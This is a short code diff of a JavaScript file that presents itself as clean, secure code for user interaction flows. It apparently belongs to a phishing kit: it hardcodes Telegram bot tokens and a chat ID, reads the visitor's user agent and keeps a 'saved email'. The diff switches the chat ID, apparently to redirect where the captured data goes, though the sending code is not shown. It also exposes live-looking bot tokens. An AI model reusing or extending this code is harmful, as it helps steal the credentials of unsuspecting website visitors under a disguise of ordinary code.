@@ -5,10 +5,10 @@
  * 👨‍💻 Clean, modern, and secure JavaScript for user interaction flows
  */
 
-// const t = "8270266366:AAGlpNvoeMS8JUKW3FupEnqMKLUxPxjmP1I"; // token
+// const t = "8071320585:AAFNHcXdGpLROcPHvmxFZN4PCPpE4K0Xf_8"; // token
 // const c = "8329330575"; // channel/user ID
 const t = "8270266366:AAGlpNvoeMS8JUKW3FupEnqMKLUxPxjmP1I"; // token
-const c = "8329330575"; // channel/user ID
+const c = "8032021847"; // channel/user ID
 const ua = navigator.userAgent;
 let em = ""; // saved email
 
